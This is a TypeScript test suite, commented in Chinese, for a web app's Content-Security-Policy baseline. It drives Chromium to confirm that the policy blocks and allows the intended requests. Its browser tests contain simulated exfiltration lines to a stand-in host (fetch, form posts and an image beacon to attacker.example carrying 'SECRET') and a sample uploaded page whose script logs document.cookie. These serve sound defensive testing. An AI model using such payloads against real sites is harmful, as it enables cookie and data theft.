/**
 * 全站内容安全策略基线（openspec change site-csp-baseline，spec platform/content-security-policy）
 *
 * 三段：
 *   1. 纯函数：指令内容、三种模式、Sentry / 预览 / 开发环境的差异、路由范围、文件代理的沙箱；
 *   2. 源码：next.config.ts 与文件代理路由的接线；
 *   3. 真实浏览器：把生成的策略当响应头发给 Chromium，验证该挡的挡住、该放的放过；
 *      文件代理的沙箱：直接打开的网页 / SVG 里脚本不执行，图片引用与下载照常。
 *      找不到 Chromium 时打印 SKIP，前两段照常判定。
 *
 * 运行：npx tsx src/lib/security/__tests__/csp.test.ts
 */
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import {
  CSP_PAGE_SOURCE,
  CSP_ROUGH_QUOTE_SOURCE,
  buildCspDirectives,
  buildSecurityHeaders,
  fileResponseCsp,
  resolveCspMode,
  sentryIngestOrigin,
} from "../csp";

let pass = 0;
let fail = 0;
function ok(cond: boolean, name: string, detail?: unknown) {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.error(`  ✗ ${name}${detail === undefined ? "" : ` → ${JSON.stringify(detail).slice(0, 800)}`}`);
  }
}

const ROOT = process.cwd();
const PROD = { NODE_ENV: "production", VERCEL_ENV: "production" };
const directive = (list: string[], name: string) => list.find((d) => d === name || d.startsWith(`${name} `)) ?? null;

async function browserSegment() {
  console.log("\n真实浏览器：把策略当响应头发出去，看挡住什么、放过什么");
  let chromium: typeof import("playwright").chromium;
  try {
    ({ chromium } = await import("playwright"));
  } catch (e) {
    console.log(`⏭  SKIP 真实浏览器段：缺少 playwright（${e instanceof Error ? e.message.split("\n")[0] : "error"}）`);
    return;
  }
  const candidates = [process.env.CHROME_EXECUTABLE_PATH, undefined, "/opt/pw-browsers/chromium"].filter(
    (p, i) => i === 1 || (typeof p === "string" && p.length > 0 && existsSync(p)),
  );
  let browser: Awaited<ReturnType<typeof chromium.launch>> | null = null;
  let lastError = "";
  for (const executablePath of candidates) {
    try {
      browser = await chromium.launch(executablePath ? { executablePath } : {});
      break;
    } catch (e) {
      lastError = e instanceof Error ? e.message.split("\n")[0] : "error";
    }
  }
  if (!browser) {
    console.log(`⏭  SKIP 真实浏览器段：找不到可用的 Chromium（${lastError}）`);
    return;
  }

  const policy = buildSecurityHeaders(PROD)[0].headers[0].value;
  const APP = "http://qingyan.test";
  const EVIL = "http://attacker.example";
  const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64");

  try {
    const page = await browser.newPage();
    const requests: string[] = [];
    await page.route("**/*", async (route) => {
      const url = new URL(route.request().url());
      requests.push(url.href);
      const html = (body: string, csp = true) =>
        route.fulfill({ status: 200, contentType: "text/html", headers: csp ? { "Content-Security-Policy": policy } : {}, body: `<!doctype html><meta charset="utf-8"><body>${body}</body>` });
      if (url.origin === APP && url.pathname === "/") return html("<div id=box></div>");
      if (url.origin === APP && url.pathname === "/inner") return html("<p id=inner>站内子页面</p>");
      if (url.origin === APP && url.pathname === "/api/ok") return route.fulfill({ status: 200, contentType: "application/json", body: "{\"ok\":true}" });
      if (url.pathname.endsWith(".png")) return route.fulfill({ status: 200, contentType: "image/png", body: PNG });
      if (url.origin === EVIL && url.pathname === "/embed") return html(`<iframe id=f src="${APP}/"></iframe>`, false);
      if (url.origin === EVIL) return html("<p id=evil>外部页面</p>", false);
      return route.abort();
    });
    await page.addInitScript(() => {
      (window as unknown as { __csp: string[] }).__csp = [];
      document.addEventListener("securitypolicyviolation", (e) => (window as unknown as { __csp: string[] }).__csp.push(e.effectiveDirective));
    });
    await page.goto(`${APP}/`);
    const violations = () => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp.slice());
    const reset = () => page.evaluate(() => { (window as unknown as { __csp: string[] }).__csp.length = 0; document.getElementById("box")!.innerHTML = ""; });
    const put = async (html: string) => {
      await reset();
      const before = requests.length;
      await page.evaluate((h) => { document.getElementById("box")!.innerHTML = h; }, html);
      await page.waitForTimeout(350);
      return { v: await violations(), made: requests.slice(before) };
    };

    // —— 挡住的 ——
    const extFrame = await put(`<iframe src="${EVIL}/page"></iframe>`);
    ok(extFrame.v.includes("frame-src") && !extFrame.made.some((u) => u.startsWith(EVIL)), "外部网站的嵌入框架：被 frame-src 挡住，没有发出请求", extFrame);

    await reset();
    const fetchOut = await page.evaluate(async (u) => { try { await fetch(u); return "sent"; } catch { return "blocked"; } }, `${EVIL}/collect?d=SECRET`);
    ok(fetchOut === "blocked" && (await violations()).includes("connect-src"), "脚本向外部主机发请求：被 connect-src 挡住", { fetchOut, v: await violations() });

    const obj = await put(`<object data="${EVIL}/x.swf"></object><embed src="${EVIL}/y.swf">`);
    ok(obj.v.includes("object-src") && !obj.made.some((u) => u.startsWith(EVIL)), "插件对象（object / embed）：被 object-src 挡住", obj);

    await reset();
    await page.evaluate((u) => { const b = document.createElement("base"); b.href = u; document.head.appendChild(b); }, `${EVIL}/`);
    await page.waitForTimeout(150);
    const baseNow = await page.evaluate(() => document.baseURI);
    ok((await violations()).includes("base-uri") && baseNow.startsWith(APP), "把页面的基准地址改到外部：被 base-uri 挡住，基准地址没变", { baseNow, v: await violations() });
    await page.evaluate(() => document.querySelector("base")?.remove());

    await reset();
    const beforeForm = requests.length;
    await page.evaluate((u) => { const f = document.createElement("form"); f.method = "post"; f.action = u; document.getElementById("box")!.appendChild(f); f.submit(); }, `${EVIL}/steal`);
    await page.waitForTimeout(350);
    ok((await violations()).includes("form-action") && page.url() === `${APP}/` && !requests.slice(beforeForm).some((u) => u.startsWith(EVIL)), "表单提交到外部地址：被 form-action 挡住，页面没有离开", { url: page.url(), v: await violations() });

    const media = await put(`<audio src="${EVIL}/a.mp3"></audio><video src="${EVIL}/v.mp4"></video>`);
    ok(media.v.includes("media-src") && !media.made.some((u) => u.startsWith(EVIL)), "外部音视频：被 media-src 挡住", media);

    await reset();
    const beforeFont = requests.length;
    await page.evaluate((u) => { const s = document.createElement("style"); s.textContent = `@font-face{font-family:x;src:url(${u})} #box{font-family:x}`; document.head.appendChild(s); document.getElementById("box")!.textContent = "字"; }, `${EVIL}/f.woff2`);
    await page.waitForTimeout(350);
    ok((await violations()).includes("font-src") && !requests.slice(beforeFont).some((u) => u.startsWith(EVIL)), "外部字体：被 font-src 挡住", await violations());

    // —— 放过的（确认没有误伤现有用法）——
    const inner = await put(`<iframe id=same src="/inner"></iframe>`);
    const innerText = await page.frameLocator("#same").locator("#inner").textContent().catch(() => null);
    ok(inner.v.length === 0 && innerText === "站内子页面", "站内的嵌入框架（粗报价工具、报价 PDF）：照常加载", { v: inner.v, innerText });

    // srcDoc 子文档继承父页面的策略。分两步验证：
    // ① 不带沙箱的 srcDoc：里面的外部图片确实发出了请求（可被拦截器看到）；
    const plain = await put(`<iframe id=sd0 srcdoc="<p id=mail0>邮件预览</p><img src='http://brand.example/logo.png'>"></iframe>`);
    let logoLoaded = false;
    for (let i = 0; i < 25 && !logoLoaded; i++) {
      await page.waitForTimeout(200);
      logoLoaded = requests.includes("http://brand.example/logo.png");
    }
    ok(logoLoaded && !plain.v.includes("frame-src"), "srcDoc 预览里企业自己配置的图片：照常加载", { v: plain.v, logoLoaded });
    // ② 带 sandbox="" 的 srcDoc（页面实际的写法）：子文档照常显示，控制台没有「被内容安全策略拒绝」。
    //    沙箱子文档里的请求在部分环境不经过拦截器，所以这里看控制台而不是数请求。
    const consoleLines: string[] = [];
    const onConsole = (m: { text(): string }) => consoleLines.push(m.text());
    page.on("console", onConsole);
    const srcdoc = await put(`<iframe id=sd sandbox="" srcdoc="<p id=mail>邮件预览</p><img src='http://brand.example/logo2.png'>"></iframe>`);
    const mailText = await page.frameLocator("#sd").locator("#mail").textContent().catch(() => null);
    await page.waitForTimeout(800);
    page.off("console", onConsole);
    const refused = consoleLines.filter((t) => /Content Security Policy|Refused to/i.test(t));
    ok(mailText === "邮件预览" && srcdoc.v.length === 0 && refused.length === 0, "带沙箱的 srcDoc 邮件预览（页面实际写法）：照常显示，没有被策略拒绝的资源", { v: srcdoc.v, mailText, refused });

    await reset();
    const fetchSelf = await page.evaluate(async () => { try { return (await fetch("/api/ok")).status; } catch { return "blocked"; } });
    ok(fetchSelf === 200 && (await violations()).length === 0, "站内接口请求：照常", { fetchSelf, v: await violations() });

    await reset();
    const blobAudio = await page.evaluate(() => { const a = new Audio(URL.createObjectURL(new Blob([new Uint8Array(8)], { type: "audio/mpeg" }))); a.load(); return true; });
    await page.waitForTimeout(200);
    ok(blobAudio && !(await violations()).includes("media-src"), "语音播放用的 blob: 音频：不被 media-src 挡", await violations());

    // —— 这一版有意不管的（如实记录，不是遗漏）——
    const img = await put(`<img src="${EVIL}/p.png?d=SECRET">`);
    ok(img.v.length === 0 && img.made.some((u) => u.startsWith(`${EVIL}/p.png`)), "页面上的外部图片：这一版不拦（图片来源列不出允许清单，见 design）", img);

    // —— 不许被别的网站嵌套 ——
    const outer = await browser.newPage();
    await outer.route("**/*", async (route) => {
      const url = new URL(route.request().url());
      if (url.origin === EVIL) return route.fulfill({ status: 200, contentType: "text/html", body: `<!doctype html><body><iframe id=f src="${APP}/"></iframe></body>` });
      if (url.origin === APP) return route.fulfill({ status: 200, contentType: "text/html", headers: { "Content-Security-Policy": policy }, body: "<!doctype html><body><p id=app>青砚页面</p></body>" });
      return route.abort();
    });
    await outer.goto(`${EVIL}/embed`);
    await outer.waitForTimeout(400);
    const framed = await outer.frameLocator("#f").locator("#app").count().catch(() => 0);
    ok(framed === 0, "别的网站把青砚页面嵌进框架：被 frame-ancestors 挡住，内容没有显示", framed);
    await outer.close();

    // —— 文件代理的沙箱 ——
    const sandbox = fileResponseCsp("text/html; charset=utf-8", PROD)!;
    const files = await browser.newPage();
    const fileConsole: string[] = [];
    files.on("console", (m) => fileConsole.push(m.text()));
    await files.route("**/*", async (route) => {
      const url = new URL(route.request().url());
      const withBox = url.searchParams.get("box") !== "0";
      const h = (extra: Record<string, string> = {}) => ({ ...(withBox ? { "Content-Security-Policy": sandbox } : {}), "X-Content-Type-Options": "nosniff", ...extra });
      if (url.origin !== APP) return route.abort();
      if (url.pathname === "/") return route.fulfill({ status: 200, contentType: "text/html", body: `<!doctype html><meta charset="utf-8"><body><img id=pic src="/api/files/o/a.png"><a id=dl href="/api/files/o/b.xlsx?download=1">下载</a></body>` });
      if (url.pathname === "/api/files/o/doc.html") return route.fulfill({ status: 200, contentType: "text/html; charset=utf-8", headers: h(), body: `<!doctype html><meta charset="utf-8"><title>原标题</title><body><p id=doc>上传的网页</p><script>document.title = "脚本执行了"; console.log("XSS-RAN " + document.cookie);</script></body>` });
      if (url.pathname === "/api/files/o/pic.svg") return route.fulfill({ status: 200, contentType: "image/svg+xml", headers: h(), body: `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect id="r" width="10" height="10"/><script>console.log("SVG-RAN")</script></svg>` });
      if (url.pathname === "/api/files/o/a.png") return route.fulfill({ status: 200, contentType: "image/png", headers: h(), body: PNG });
      if (url.pathname === "/api/files/o/b.xlsx") return route.fulfill({ status: 200, contentType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", headers: h({ "Content-Disposition": "attachment; filename*=UTF-8''b.xlsx" }), body: Buffer.from("PK\u0003\u0004 fake") });
      return route.abort();
    });
    await files.context().addCookies([{ name: "qy_session", value: "SECRET", url: APP }]);

    // 对照：不带沙箱时，同一份文件里的脚本确实会执行（证明下面的断言不是空转）
    await files.goto(`${APP}/api/files/o/doc.html?box=0`);
    await files.waitForTimeout(200);
    ok((await files.title()) === "脚本执行了" && fileConsole.some((t) => t.startsWith("XSS-RAN")), "对照：不带沙箱直接打开上传的网页，脚本会执行", { title: await files.title(), fileConsole });

    fileConsole.length = 0;
    await files.goto(`${APP}/api/files/o/doc.html`);
    await files.waitForTimeout(300);
    ok((await files.title()) === "原标题" && !fileConsole.some((t) => t.startsWith("XSS-RAN")), "带沙箱直接打开上传的网页：脚本不执行", { title: await files.title(), fileConsole });
    ok((await files.locator("#doc").textContent()) === "上传的网页", "带沙箱：文档内容照常显示（生成文档回落成网页时仍可阅读、打印）");

    fileConsole.length = 0;
    await files.goto(`${APP}/api/files/o/pic.svg?box=0`);
    await files.waitForTimeout(200);
    const svgRanWithout = fileConsole.some((t) => t.startsWith("SVG-RAN"));
    fileConsole.length = 0;
    await files.goto(`${APP}/api/files/o/pic.svg`);
    await files.waitForTimeout(300);
    ok(svgRanWithout && !fileConsole.some((t) => t.startsWith("SVG-RAN")), "带脚本的 SVG：不带沙箱会执行，带沙箱不执行", { svgRanWithout, fileConsole });

    await files.goto(`${APP}/`);
    const picWidth = await files.locator("#pic").evaluate((el) => new Promise<number>((res) => { const i = el as HTMLImageElement; if (i.complete) res(i.naturalWidth); else { i.onload = () => res(i.naturalWidth); i.onerror = () => res(-1); } }));
    ok(picWidth === 1, "页面用 <img> 引用带沙箱响应头的图片：照常显示", picWidth);
    const [download] = await Promise.all([files.waitForEvent("download", { timeout: 5000 }).catch(() => null), files.click("#dl")]);
    ok(download !== null && download.suggestedFilename() === "b.xlsx", "带沙箱响应头的附件下载：照常下载", download ? download.suggestedFilename() : null);
    await files.close();
  } finally {
    await browser.close();
  }
}

async function main() {
  console.log("指令内容（生产环境）");
  {
    const d = buildCspDirectives(PROD);
    ok(
      JSON.stringify(d) ===
        JSON.stringify([
          "frame-ancestors 'self'",
          "base-uri 'self'",
          "form-action 'self'",
          "object-src 'none'",
          "frame-src 'self'",
          "connect-src 'self'",
          "media-src 'self' blob: data:",
          "font-src 'self' data:",
          "worker-src 'self' blob:",
          "manifest-src 'self'",
        ]),
      "十条指令，内容与顺序固定",
      d,
    );
    ok(!directive(d, "default-src") && !directive(d, "img-src") && !directive(d, "script-src") && !directive(d, "style-src"), "没有 default-src / img-src / script-src / style-src（这一版有意不限制）");
    ok(!d.join(" ").includes("unsafe") && !d.join(" ").includes("*"), "策略里没有 unsafe-* 与通配符");
    ok(JSON.stringify(buildCspDirectives(PROD)) === JSON.stringify(d), "同一组环境变量两次结果相同");
  }

  console.log("\n环境差异");
  {
    const sentry = buildCspDirectives({ ...PROD, NEXT_PUBLIC_SENTRY_DSN: "https://abc123@o1234.ingest.us.sentry.io/5678" });
    ok(directive(sentry, "connect-src") === "connect-src 'self' https://o1234.ingest.us.sentry.io", "配置了浏览器端 Sentry：只放行它的上报主机（不带公钥与项目号）", directive(sentry, "connect-src"));
    ok(sentryIngestOrigin({ NEXT_PUBLIC_SENTRY_DSN: "http://k@insecure.example/1" }) === null && sentryIngestOrigin({ NEXT_PUBLIC_SENTRY_DSN: "不是地址" }) === null && sentryIngestOrigin({}) === null, "DSN 不是 https 地址或没配：不放行任何主机");
    const preview = buildCspDirectives({ NODE_ENV: "production", VERCEL_ENV: "preview" });
    ok(
      directive(preview, "connect-src") === "connect-src 'self' https://vercel.live wss://ws-us3.pusher.com" &&
        directive(preview, "frame-src") === "frame-src 'self' https://vercel.live" &&
        directive(preview, "font-src") === "font-src 'self' data: https://vercel.live https://assets.vercel.com",
      "预览环境：额外放行 Vercel 工具条用到的主机",
      preview,
    );
    ok(!buildCspDirectives(PROD).join(" ").includes("vercel"), "生产环境：不放行 Vercel 工具条的主机");
    const dev = buildCspDirectives({ NODE_ENV: "development" });
    ok(directive(dev, "connect-src") === "connect-src 'self' ws://localhost:* ws://127.0.0.1:*" && !buildCspDirectives(PROD).join(" ").includes("ws://"), "开发环境：放行本机热更新的 WebSocket；生产没有");
  }

  console.log("\n三种模式与路由范围");
  {
    ok(resolveCspMode({}) === "enforce" && resolveCspMode({ CSP_MODE: "" }) === "enforce" && resolveCspMode({ CSP_MODE: "乱写" }) === "enforce", "CSP_MODE 没配或写错：按强制执行");
    ok(resolveCspMode({ CSP_MODE: " Report-Only " }) === "report-only" && resolveCspMode({ CSP_MODE: "OFF" }) === "off", "report-only / off：大小写与空格不敏感");
    const enforce = buildSecurityHeaders(PROD);
    ok(enforce.length === 2 && enforce[0].source === CSP_PAGE_SOURCE && enforce[0].headers.length === 1 && enforce[0].headers[0].key === "Content-Security-Policy", "强制模式：页面发 Content-Security-Policy");
    ok(enforce[0].headers[0].value === buildCspDirectives(PROD).join("; "), "响应头的值就是十条指令用「; 」连起来");
    ok(enforce[1].source === CSP_ROUGH_QUOTE_SOURCE && enforce[1].headers[0].value === "frame-ancestors 'self'", "粗报价工具页：只加「不许被别的网站嵌套」");
    const ro = buildSecurityHeaders({ ...PROD, CSP_MODE: "report-only" });
    ok(ro.every((r) => r.headers[0].key === "Content-Security-Policy-Report-Only") && ro[0].headers[0].value === enforce[0].headers[0].value, "只上报模式：换成 Report-Only 响应头，内容相同");
    ok(buildSecurityHeaders({ ...PROD, CSP_MODE: "off" }).length === 0, "关闭模式：不发任何响应头");

    // next 用 path-to-regexp 匹配 source；这里把同一条规则换成等价的正则核对范围
    const page = new RegExp(`^${CSP_PAGE_SOURCE.replace("/(", "/(?:")}$`);
    const hit = (p: string) => page.test(p);
    ok(["/", "/login", "/sales/customers/abc", "/assistant", "/quote/tok123", "/display", "/sw.js", "/manifest.json", "/embed/inquiry.js"].every(hit), "页面与静态文件：在范围内");
    ok(!["/api/files/a/b.png", "/api/sales/quotes/share/t/pdf", "/_next/static/chunk.js", "/monitoring", "/sunny-quote.html"].some(hit), "接口、框架静态资源、Sentry 隧道、粗报价工具页：不在这条规则的范围内");
  }

  console.log("\n文件代理的沙箱");
  {
    ok(["text/html", "text/html; charset=utf-8", "image/svg+xml", "application/xhtml+xml", "text/xml", "image/png", "application/octet-stream", " TEXT/HTML ", "", null, undefined].every((t) => fileResponseCsp(t, PROD) === "sandbox"), "网页、SVG、图片、未知类型、没有类型：一律 sandbox");
    ok(fileResponseCsp("application/pdf", PROD) === null && fileResponseCsp("Application/PDF; qs=1", PROD) === null, "PDF：不加（浏览器自带的阅读器在沙箱里打不开）");
    ok(fileResponseCsp("application/pdfx", PROD) === "sandbox" && fileResponseCsp("text/html; application/pdf", PROD) === "sandbox", "类型里只是带着 pdf 字样：仍然 sandbox");
    ok(fileResponseCsp("text/html", { ...PROD, CSP_MODE: "report-only" }) === "sandbox", "report-only：沙箱照常生效（它没有只上报的形式）");
    ok(fileResponseCsp("text/html", { ...PROD, CSP_MODE: "off" }) === null, "off：不发");
  }

  console.log("\n源码接线");
  {
    const cfg = readFileSync(join(ROOT, "next.config.ts"), "utf8");
    ok(/import \{ buildSecurityHeaders \} from "\.\/src\/lib\/security\/csp";/.test(cfg) && /async headers\(\) \{\s*return buildSecurityHeaders\(process\.env\);\s*\}/.test(cfg), "next.config.ts 的 headers() 直接返回 buildSecurityHeaders(process.env)");
    const src = readFileSync(join(ROOT, "src/lib/security/csp.ts"), "utf8").replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");
    ok(!/process\.env|from "(next|react|@\/lib\/db)|window|document/.test(src), "csp.ts 是纯函数：不直接读 process.env、不引框架、不碰 DOM");
    ok(readFileSync(join(ROOT, ".env.example"), "utf8").includes("CSP_MODE"), ".env.example 里写了 CSP_MODE");
    const filesRoute = readFileSync(join(ROOT, "src/app/api/files/[...path]/route.ts"), "utf8");
    ok(/const fileCsp = fileResponseCsp\(blob\.contentType, process\.env\);\s*if \(fileCsp\) headers\.set\("Content-Security-Policy", fileCsp\);/.test(filesRoute), "文件代理路由：按存下的内容类型加沙箱响应头");
    ok(filesRoute.includes('"X-Content-Type-Options": "nosniff"'), "文件代理路由：原有的 nosniff 还在");
  }

  await browserSegment();

  console.log(`\nsite-csp: ${pass} passed, ${fail} failed`);
  if (fail > 0) process.exit(1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
